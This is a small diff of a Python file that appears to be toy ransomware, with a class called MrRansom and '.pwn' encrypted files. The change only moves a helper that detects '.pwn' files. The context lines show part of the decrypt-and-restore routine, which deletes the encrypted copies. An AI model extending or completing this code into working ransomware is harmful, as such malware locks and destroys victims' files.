@@ -22,6 +22,11 @@ def get_file_bytes(file_name):
     return file_bytes
 
 
+def is_encrypted_file(filename):
+    if filename.endswith(".pwn"):
+        return True
+
+
 class MrRansom:
 
     def __init__(self, root_dir, key):
@@ -77,11 +82,6 @@ class MrRansom:
         put_file_bytes(base64.b64decode(decrypted), "{}/{}".format(self.root_dir, file_name.replace(".pwn", "")))
 
         os.remove("{}/{}".format(root_dir, file_name))
-
-
-def is_encrypted_file(filename):
-    if filename.endswith(".pwn"):
-        return True
 
 
 if __name__ == '__main__':
